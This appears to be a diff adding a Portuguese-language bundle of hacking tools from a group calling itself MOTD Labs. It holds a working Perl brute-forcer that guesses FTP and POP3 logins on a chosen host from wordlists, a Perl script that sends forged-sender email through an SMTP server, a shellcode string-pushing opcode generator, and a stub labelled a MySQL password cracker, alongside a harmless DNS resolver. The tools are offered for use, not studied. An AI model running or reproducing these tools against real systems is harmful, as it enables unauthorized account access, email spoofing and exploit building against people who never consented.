@@ -1,0 +1,846 @@
+<++> ferramentas/adivinheitor.pl
+#!/usr/bin/perl
+# Adivinheitor v0.1
+# MOTD Labs  ( http://www.motdlabs.org )
+# coded by inferninh0 (inferninho@motdlabs.org)
+# Descricao: Brute Force para ftp e pop3
+####
+
+use Socket; 
+use Net::FTP; 
+use Net::POP3;
+
+
+## Main Code 
+####
+
+&banner;
+print "Daemon: ";
+$servico = <STDIN>;
+chomp ($servico);
+
+### FTP
+
+if ($servico eq "ftp")
+{
+&inicia();
+if ($ftp = Net::FTP->new($host, Timeout =>5, Errmode => "return"))
+{
+&conectado();
+}
+else
+{
+&n_conectado();
+}
+while ($name = <IN1>)
+{
+chomp ($name);
+open (IN2, $password);
+while ($pass = <IN2>)
+{
+chomp ($pass);
+&cool();
+if ($passin = $ftp->login($name, $pass))
+{
+$ftp->quit();
+&resultado();
+}
+}
+close (IN2);
+}
+&nda();
+$ftp->quit();
+}
+
+### POP3 
+
+elsif ($servico eq "pop3")
+{
+&inicia();
+if ($pop = Net::POP3->new($host, Timeout =>10))
+{
+&conectado();
+}
+else
+{
+&n_conectado();
+}
+while ($name = <IN1>)
+{
+chomp ($name);
+open (IN2, $password);
+while ($pass = <IN2>)
+{
+chomp ($pass);
+&cool();
+if ($pop->login($name, $pass))
+{
+$pop->quit();
+&resultado();
+}
+}
+close (IN2);
+}
+$pop->quit();
+&nda();
+}
+
+elsif (($servico ne "ftp") or ($servico ne "pop3"))
+{
+	print "\nDaemon invalido, use ftp ou pop3...;-)\n";
+}
+
+
+## Sub 
+####
+
+sub banner {
+system("clear");
+    print "\t\t\tAdivinheitor v0.1\n";
+    print "\t\t\t~~~~~~~~~~~~~~~~~\n\n\n";
+} print;
+
+sub inicia {
+print "Hostname: ";
+$host = <STDIN>;
+chomp ($host);
+$str= inet_aton($host) or die ("\nHost $host nao encontrado... Programa fechado");
+$address_in=inet_ntoa($str);
+print "Arquivo Username : ";
+$username=<STDIN>;
+chomp ($username);
+print "Arquivo Password : ";
+$password = <STDIN>;
+chomp ($password);
+print "\n";
+open (IN1, $username) or die "O arquivo username nao existe\n";
+open (IN2, $password) or die "O arquivo password nao existe\n";
+close (IN2);
+}
+
+sub conectado {
+print "conectado em $host...\n\n";}
+
+sub n_conectado {
+die ("Falha na conexao... daemon esta inativo...:-(\n");}
+
+sub nda {
+print "\nNenhuma conta valida encontrada...:-(\n\n";
+close (IN1);
+sleep (2);}
+
+sub cool {
+print "Username: ";
+print $name;
+print " Password: ";
+print $pass;
+print "\n";}
+
+sub resultado {
+print "\n-[+]--------------Resultado----------------[+]-\n\n";
+print "    Username valido : $name\n";
+print "    Password valido : $pass\n";
+sleep (2);
+close (IN1);
+close (IN2);
+die "\n-[+]--------------Resultado----------------[+]-\n\n";}
+<--> ferramentas/adivinheitor.pl
+
+<++> ferramentas/dns.c
+/*
+ * Narcotic Domain Name Resolver (nao tinha um nomezinho melhor nao?)
+ *  
+ * compilar no linux   --> gcc -o dns dns.c -DLINUX
+ * compilar no windows --> cl /DWIN32 dns.c /link ws2_32.lib
+ */
+#include <stdio.h>
+#include <stdlib.h>
+
+#ifdef WIN32
+  #include <winsock2.h>
+#endif
+
+#ifdef LINUX
+  #include <netdb.h>            /* gethostbyname, gethostbyaddr, etc */
+  #include <netinet/in.h>       /* definicao do struct in_addr       */
+#endif
+  
+
+#define TAMBUF  1024
+
+void usage(char *programname)
+{
+	printf("Narcotic Domain Name Resolver ---\n");
+	printf("Copyright (c) - 2003 by Narcotic <narcotic@motdlabs.org>\n");
+	printf("Uso: %s <arquivo entrada> <arquivo saida>\n\n",programname);
+}
+
+void debuging(struct hostent *h)
+{
+	int i = 0;
+      	
+      	printf("Hostname: %s\n", h->h_name);
+      	
+      	while (h->h_aliases[i])
+        	printf("Alias: %s\n", h->h_aliases[i++]);
+        	
+      	switch (h->h_addrtype) 
+      	{
+        	case AF_INET:
+        	case AF_INET6:
+        	
+          	for (i = 0; h->h_addr_list[i]; ++i)
+            		printf("Address: %u.%u.%u.%u\n",
+                    		(0xff & h->h_addr_list[i][0]),
+                    		(0xff & h->h_addr_list[i][1]),
+                    		(0xff & h->h_addr_list[i][2]),
+                    		(0xff & h->h_addr_list[i][3]));
+	}
+}
+
+int resolve(char *s,FILE *fp)
+{
+	struct hostent *hp;
+	unsigned long	a;
+			
+	a = inet_addr(s);
+	
+	if(a != INADDR_NONE)
+	{
+		if((hp = gethostbyaddr((char *)&a, sizeof(a), AF_INET)) == NULL)
+		{
+			fprintf(stderr,"Impossivel resolver %s\n",s);
+			return -2;
+		}
+		
+		fprintf(fp,"%s\n",hp->h_name);
+		debuging(hp);
+		
+		return 0;
+	}
+	
+	if((hp = gethostbyname(s)) != NULL)
+	{	
+		debuging(hp);
+		fprintf(fp,"%u.%u.%u.%u\n",
+                    		(0xff & hp->h_addr[0]),
+                    		(0xff & hp->h_addr[1]),
+                    		(0xff & hp->h_addr[2]),
+                    		(0xff & hp->h_addr[3]));
+		
+		return 0;
+	}
+
+	return -1;
+}
+
+int main(int argc, char **argv)
+{
+	char buf[TAMBUF];
+	char *infile, *outfile;
+	FILE *infp, *outfp;
+	int cnt;
+
+#ifdef WIN32
+
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	int err;
+   
+	wVersionRequested = MAKEWORD( 2, 0 );
+	err = WSAStartup( wVersionRequested, &wsaData );
+
+  	if ( err != 0 )
+      		return -1;
+
+#endif   /* #ifdef WIN32 */
+
+	
+	
+	if(argc < 2)
+	{
+		usage(argv[0]);
+		return -1;
+	}
+	
+	infile  = argv[1];
+	outfile = argv[2];
+	
+	infp = fopen(infile,"r");
+	
+	if(!infp)
+	{
+		fprintf(stderr,"Erro ao abrir o arquivo %s. Programa encerrado!\n",infile);
+		return -2;
+	}
+	
+	outfp = fopen(outfile,"w");
+	
+	while(fgets(buf,TAMBUF,infp) != NULL)
+	{		
+		/* remover \r\n */
+		cnt = strlen(buf);				
+		
+		if(buf[cnt - 1] == '\n')
+			cnt--;			
+		if(buf[cnt - 1] == '\r')
+			cnt--;
+					
+		if(cnt == 0)
+		   continue;
+		   
+		buf[cnt] = '\0';
+		
+			
+		resolve(buf,outfp);
+	}
+	
+	fclose(infp);
+	fclose(outfp);
+	
+	printf("Programa terminado!!!\n");
+	return 0;
+}
+<--> ferramentas/dns.c
+
+<++> ferramentas/empilha.c
+/*
+ * Empilhador de strings - Copyright 2004 by Narcotic <narcotic@motdlabs.org>
+ *
+ *
+ * Esse programa cria codigo p/ empilhar strings na pilha e ser usada num shellcode
+ *   Uso: empilha [-o] [-s sintaxe] [-r registrador] string
+ *	-o               imprime os opcode
+ *	-s sintaxe       sintaxe usada [att/intel]
+ *	-r registrador   registrador q vai receber o end da string
+ *                   	 (eax, ebx, ecx ou edx)
+ *    
+ * Ex de uso: empilha -s intel -o -r edx ABCDEF
+ *
+ *
+ * Por padrao o programa assume o uso do registrador eax e da sintaxe INTEL
+ *
+ */
+ 
+ 
+#include <stdio.h>
+#include <string.h>
+
+#ifndef false
+#define false 0
+#define true  1
+#endif
+
+enum 
+{
+	ATT,
+	INTEL
+};
+
+
+#define PUSHA	"pushl $"
+#define PUSHI	"push "
+
+char *registers[] = { 
+	"eax", "ebx", "ecx", "edx" 
+};
+
+/****     construcao dos opcodes p/ o shellcode            ****/
+/* Esse codigo cuida apenas de alguns opcodes, limitados aos  */
+/* q o programa gera p/ empilhar a string, sao eles:          */
+/*  mov, xor, push e shr                                      */
+
+/* cada registrador eh representado por 3 bits */
+enum 
+{
+	EAX,      /* 000 */
+	ECX,	  /* 001 */
+	EDX,	  /* 010 */
+	EBX,	  /* 011 */
+	ESP	  /* 100 */
+};
+
+typedef union _instruction {
+	unsigned char bytes[4];
+	unsigned int  opcode;
+} instruction;
+
+typedef struct _command {
+	instruction inst;
+	unsigned char *data;
+	unsigned char *dissasm;
+	struct _command *next;
+} command;
+
+
+/* 0011 0011 11 reg reg */
+#define XOR_REGISTER 0x33C0
+
+/* move valor imediato p/ registrador */
+/* 1011 w reg : dados */
+#define MOV_REGISTER_DATA 0xB0
+/* 1000 1011 11 reg reg */
+#define MOV_REGISTER_REGISTER 0x8BC0
+
+/* tamanho dos operadores - 1 byte sig 16 bits */
+#define OPERAND_SIZE 0x66
+
+/* 0101 0 reg */
+#define PUSH_REGISTER 0x50
+/* 0110 1000 : dados */
+#define PUSH_IMMEDIATE 0x68
+
+/* 1100 0001 1110 1 reg : dados */
+#define SHR_REGISTER_IMM 0xC1E8
+
+
+/* macros */
+#define XOR_RR(reg1,reg2)	(XOR_REGISTER | (reg1 << 3) | reg2)
+#define SHR_RI(reg)		(SHR_REGISTER_IMM | reg)
+
+#define MOV_RI32(reg)		(MOV_REGISTER_DATA | 0x08 | reg)
+#define MOV_RI16(reg)		((OPERAND_SIZE << 8) | (MOV_REGISTER_DATA | 0x08 | reg))
+#define MOV_RI8(reg)		(MOV_REGISTER_DATA | reg)
+#define MOV_RR(reg1,reg2)	(MOV_REGISTER_REGISTER | (reg1 << 3) | reg2)
+
+#define PUSH_R(reg)		(PUSH_REGISTER | reg)
+#define PUSH_I()		(PUSH_IMMEDIATE)
+
+		
+int main(int argc, char **argv)
+{
+	int len;
+	char *str, *reg, *push;
+	char reg_opcode;
+	
+	char buff[64] = { 0 };
+	char *param;
+	int sintaxe, i;
+	int print_opcodes;
+
+	command *tmp, *actual, *list = NULL;
+	
+	
+	if(argc < 2)
+	{
+		printf("Empilhador de strings 32-bit para 80x86\n");
+		printf("Copyright (c) by Narcotic <narcotic@motdlabs.org>\n");
+		printf("   Uso: empilha [-o] [-s sintaxe] [-r registrador] string\n");
+		printf("   -o               imprime os opcode\n");
+		printf("   -s sintaxe       sintaxe usada [att/intel]\n");
+		printf("   -r registrador   registrador q vai receber o end da string\n");
+		printf("                    (eax, ebx, ecx ou edx\n\n");
+		
+		return -1;
+	}
+
+	/* valores assumidos por padrao */
+	reg        = registers[0]; /* EAX */
+	reg_opcode = EAX;
+	sintaxe    = INTEL;
+	print_opcodes = false;
+	
+	/* trata a entrada */
+	for(i = 1; i < argc; i++)
+	{
+		if(argv[i][0] == '-')
+		{
+			switch(argv[i][1])
+			{
+				case 'o': print_opcodes = true;
+				          break; 
+				          
+				case 's': if((i + 1) == argc)
+					  {
+					  	printf("argumento invalido \"-s\": falta sintaxe\n");
+					  	return -1;
+					  }
+					  
+					  param = argv[i + 1];
+					  
+					  if(strcmp(param,"att") == 0)
+					  	sintaxe = ATT;
+					  else if(strcmp(param,"intel") == 0)
+					  	sintaxe = INTEL;
+					  else
+					  {
+					  	printf("argumento invalido \"-s\": sintaxe inexistente\n");
+					  	return -1;
+					  }
+					  
+					  break;
+					  	
+				case 'r': if((i + 1) == argc)
+					  {
+					  	printf("argumento invalido \"-r\": falta registrador\n");
+					  	return -1;
+					  }
+					  
+					  param = argv[i + 1];
+					  
+					  if(param[0] == 'e' && param[2] == 'x')
+					  {					  	
+					  	int reg_num = param[1] - 'a';
+					  	
+					  	if(reg_num >= 0 && reg_num < 4)
+					  	{
+					  		reg = registers[reg_num];
+					  		
+					  		switch(reg_num)
+					  		{
+		  						case 0: reg_opcode = EAX; break;
+								case 1: reg_opcode = EBX; break;
+								case 2: reg_opcode = ECX; break;
+								case 3: reg_opcode = EDX; break;
+							}
+						}
+						else
+						{
+						  	printf("argumento invalido \"-r\": registrador desconhecido\n");
+						  	return -1;
+						}
+					}
+					else
+					{
+					  	printf("argumento invalido \"-r\": registrador desconhecido\n");
+					  	return -1;
+					}
+					
+					break;
+					
+				default: /* nao eh ultimo parametro *string* */
+					if(i != argc - 1)
+					{
+						printf("parametro desconhecido\n");
+						return -1;
+					}
+			}
+		}
+	}
+	
+	
+	str = argv[argc - 1];
+	len = strlen(str);
+	
+	/* aloca memoria p/ o primeiro elemento da nossa lista */
+	list 	   = (command *)malloc(sizeof(command));
+	list->next = NULL;
+	
+	actual = tmp = list;
+				
+	/* apenas 4 caracteres podem ser empilhados por vez */
+	switch(len % 4)
+	{
+		/* nossa string eh multipla de 4 */
+		/* nao faz nda         		 */
+		case 0: break;
+			
+		/* esta sobrando um byte  	     */
+		/* carrega ele em xl (al, bl, cl..)  */
+		case 1: tmp->inst.opcode = MOV_RI8(reg_opcode);
+		 	tmp->data        = (char *)malloc(2 * sizeof(char));
+		 	strcpy(tmp->data,str + len - 1);
+		 			
+			if(sintaxe == INTEL)
+				sprintf(buff,"mov %cl, 0x%02X",reg[1],str[len - 1]);
+			else
+				sprintf(buff,"movl $0x%02X, %%%cl",str[len - 1],reg[1]);
+				
+			tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+			strcpy(tmp->dissasm,buff);
+			break;
+			
+		/* 2 bytes sobrando 	     */
+		/* joga em xx (ax, bx, cx..) */
+		case 2:	tmp->inst.opcode = MOV_RI16(reg_opcode);
+		 	tmp->data        = (char *)malloc(3 * sizeof(char));
+		 	strcpy(tmp->data,str + len - 2);
+		 	
+			if(sintaxe == INTEL)
+				sprintf(buff,"mov %cx, 0x%02X%02X",reg[1],str[len - 1],str[len - 2]);
+			else
+				sprintf(buff,"movl $0x%02X%02X, %%%cx",str[len - 1],str[len - 2],reg[1]);				
+			
+			tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+			strcpy(tmp->dissasm,buff);
+			break;
+		
+		/* 3 bytes sobrando -- aki a coisa complica */
+		/* precisamos mover 3 bytes e nao deixar sobrar 0x00 */
+		/* entao dividimos em 2 instrucoes, um mov com 3 bytes + 1 byte de lixo */
+		/* e um shr, q vai tirar o lixo p/ gente e depois empilha :) */
+		case 3: tmp->inst.opcode = MOV_RI32(reg_opcode);
+		 	tmp->data        = (char *)malloc(5 * sizeof(char));
+		 	strcpy(tmp->data,str + len - 3);
+		 	strcat(tmp->data,"\xFF");
+				
+			if(sintaxe == INTEL)
+				sprintf(buff,"mov %s, 0x%02X%02X%02XFF",reg,str[len - 1],str[len - 2],str[len - 3]);
+			else
+				sprintf(buff,"movl $0x%02X%02X%02XFF, %%%s",str[len - 1],str[len - 2],str[len - 3],reg);
+
+			tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+			strcpy(tmp->dissasm,buff);
+
+			actual    = tmp;
+			
+			tmp 	  = (command *)malloc(sizeof(command));
+			tmp->next = NULL;
+			actual->next = tmp;
+			
+			tmp->inst.opcode = SHR_RI(reg_opcode);
+		 	tmp->data        = (char *)malloc(2 * sizeof(char));
+		 	strcpy(tmp->data,"\x08");
+			
+			if(sintaxe == INTEL)
+				sprintf(buff,"shr %s, 8",reg);
+			else
+				sprintf(buff,"shr  $0x8, %%%s",reg);
+
+			tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+			strcpy(tmp->dissasm,buff);
+			break;
+	}
+
+
+	/* push p/ intel ou p/ AT&T */
+	if(sintaxe == INTEL)
+		push = PUSHI;
+	else
+		push = PUSHA;
+		
+	actual = tmp;
+
+	/* coloca o xor como o primeiro na lista */
+	tmp       = (command *)malloc(sizeof(command));
+	tmp->next = list;
+	list      = tmp;
+			
+	tmp->inst.opcode = XOR_RR(reg_opcode,reg_opcode);
+ 	tmp->data        = NULL;
+	
+	if(sintaxe == INTEL)
+		sprintf(buff,"xor %s, %s",reg,reg);
+	else
+		sprintf(buff,"xorl %%%s, %%%s",reg,reg);
+	
+	tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+	strcpy(tmp->dissasm,buff);
+	
+
+	if(len % 4)	
+	{
+		tmp = (command *)malloc(sizeof(command));
+		tmp->next    = NULL;
+		actual->next = tmp;	
+	}
+	else
+		tmp = actual;
+			
+	tmp->inst.opcode = PUSH_R(reg_opcode);
+ 	tmp->data        = NULL;
+	
+	/* empilha o registrador contendo o final da string */	 
+	if(sintaxe == INTEL)
+		sprintf(buff,"push %s",reg);
+	else
+		sprintf(buff,"pushl %%%s",reg);
+		
+	tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+	strcpy(tmp->dissasm,buff);
+	
+	actual = tmp;
+		
+	/* string de cabeca p/ baixo */
+	for(i = len - (len % 4) - 4; i >= 0; i -= 4)
+	{
+		tmp 	     = (command *)malloc(sizeof(command));
+		tmp->next    = NULL;
+		actual->next = tmp;
+			
+		tmp->inst.opcode = PUSH_I();
+ 		tmp->data        = (char *)malloc(sizeof(char) * 5);
+ 		memcpy(tmp->data,str + i,4);
+ 		tmp->data[4] = 0;
+		
+		sprintf(buff,"%s0x%02X%02X%02X%02X",push,str[i + 3],str[i + 2],str[i + 1],str[i]);
+		tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+		strcpy(tmp->dissasm,buff);
+		
+		actual = tmp;
+	}
+		
+	/* move o end da string p/ registrador */
+	tmp 	     = (command *)malloc(sizeof(command));
+	tmp->next    = NULL;
+	actual->next = tmp;
+			
+	tmp->inst.opcode = MOV_RR(reg_opcode,ESP);
+	tmp->data        = NULL;
+	
+	
+	if(sintaxe == INTEL)
+		sprintf(buff,"mov %s, esp",reg);
+	else
+		sprintf(buff,"movl %%esp, %%%s",reg);
+		
+	tmp->dissasm = (char *)malloc((strlen(buff) + 1) * sizeof(char));
+	strcpy(tmp->dissasm,buff);
+	
+	for(tmp = list; tmp; tmp = tmp->next)
+	{
+		if(print_opcodes)
+		{
+			if(tmp->inst.bytes[1])
+				sprintf(buff,"\\x%02X\\x%02X",tmp->inst.bytes[1],tmp->inst.bytes[0]);
+			else
+				sprintf(buff,"\\x%02X",tmp->inst.bytes[0]);
+			
+			if(tmp->data != NULL)
+			{
+				len = strlen(tmp->data);
+				
+				for(i = 0; i < len; i++)
+					sprintf(buff,"%s%\\x%02X",buff,tmp->data[i]);
+			}
+				
+			printf("% -24s /* ",buff);
+		}
+		
+		printf("%s",tmp->dissasm);
+		
+		if(print_opcodes)
+			printf(" */");
+		
+		printf("\n");
+	}
+	
+	return 0;		
+}
+<--> ferramentas/empilha.c
+
+<++> ferramentas/falsificator.pl
+#!usr/bin/perl
+# Falsificator v 0.1  -> programa para envio de fakemail
+# MOTD Labs -----------> http://www.motdlabs.org
+# coded by inferninh0 (inferninho@motdlabs.org)
+###
+
+print STDERR "\n-[+]--------------------------------[+]-\n";
+print STDERR "       Falsificator by inferninh0\n";
+print STDERR "-[+]--------------------------------[+]-\n";
+
+use IO::Socket;
+my ($HOST,$MAIL,$RCPT,$SUBJECT,$MSG);
+print "\n[+] Servidor SMTP: ";
+chomp($HOST=<STDIN>);
+print "[+] Mail Remetente: ";
+chomp($MAIL=<STDIN>);
+print "[+] Mail Destinatario: ";
+chomp($RCPT=<STDIN>);
+print "[+] Assunto: ";
+chomp($SUBJECT=<STDIN>);
+print "[+] Arquivo contendo a menssagem: ";
+chomp($MSG=<STDIN>);
+open(INFO, $MSG);
+@msg = <INFO>;
+my $socket = IO::Socket::INET->new(
+                                   PeerAddr => "$HOST",
+                                   PeerPort => "25",
+                                   Prot => "tcp"
+                                  );
+die "Nao foi possivel criar a socket\n" unless $socket;
+if ($socket) {
+        print $socket "helo localhost\n" or die "SERVIDOR NAO VULNERAVEL...:(";
+        sleep 1;
+        print $socket "mail from: $MAIL\n" or die "SERVIDOR NAO VULNERAVEL...:(";
+        sleep 1;
+        print $socket "rcpt to: $RCPT \n" or die "SERVIDOR NAO VULNERAVEL...:(";
+        sleep 1;
+        print $socket "data\n" or die "SERVIDOR NAO VULNERAVEL...:(";
+        sleep 1;
+        print $socket "From: $MAIL\n" or die "ERRO NO ENVIO DA MSG...:(";
+        sleep 1;
+        print $socket "To: $RCTP\n" or die "ERRO NO ENVIO DA MSG...:(";
+        sleep 1;
+        print $socket "Subject: $SUBJECT\n" or  die "ERRO NO ENVIO DA MSG...:(";
+        sleep 1;
+        print $socket "\n";
+        sleep 1;
+        print $socket "@msg\n" or die "ERRO NO ENVIO DA MSG...:(";
+        sleep 1;
+        print $socket "\n";
+        sleep 1;
+        print $socket ".\n" or die "ERRO NO ENVIO DA MSG...:(";
+        sleep 1;
+}
+close ($socket);
+close(INFO);
+print "\n[+] Fakemail enviado...=D\n\n";
+exit;
+
+<--> ferramentas/falsificator.pl
+
+<++> ferramentas/mysql_passwd.c
+/* 
+ * Crack MySQL passwords with wordlist.
+ * by Narcotic - <narcotic@motdlabs.org>
+ *
+ */
+#include <stdio.h>
+#include <string.h>
+
+
+typedef unsigned char uchar;
+typedef unsigned long ulong;
+
+
+/* 
+ * riped of MySQL source code
+ * file: libmysql/password.c
+ */
+void hash_password(ulong *result, const char *password)
+{
+  register ulong nr = 1345345333L, add=7, nr2=0x12345671L;
+  ulong tmp;
+  
+  for (; *password ; password++)
+  {
+    if (*password == ' ' || *password == '\t')
+       continue;			/* skipp space in password */
+       
+    tmp  = (ulong) (uchar) *password;
+    nr  ^= (((nr & 63)+add)*tmp)+ (nr << 8);
+    nr2 += (nr2 << 8) ^ nr;
+    add += tmp;
+  }
+  
+  result[0] = nr  & (((ulong) 1L << 31) -1L); /* Don't use sign bit (str2int) */
+  result[1] = nr2 & (((ulong) 1L << 31) -1L);
+}
+
+void print_hash(char *pass)
+{
+	ulong result[2];
+	
+	hash_password(result,pass);
+	printf("0x%8x%8x\n",result[0],result[1]);
+	
+}
+
+int main()
+{
+	char str[10];
+	int i;
+	
+	str[1] = 0;
+	
+	for(i = 240; i < 255; i++)
+	{
+		str[0] = i;
+		print_hash(str);
+	}
+	
+	return 0;
+}
+<--> ferramentas/mysql_passwd
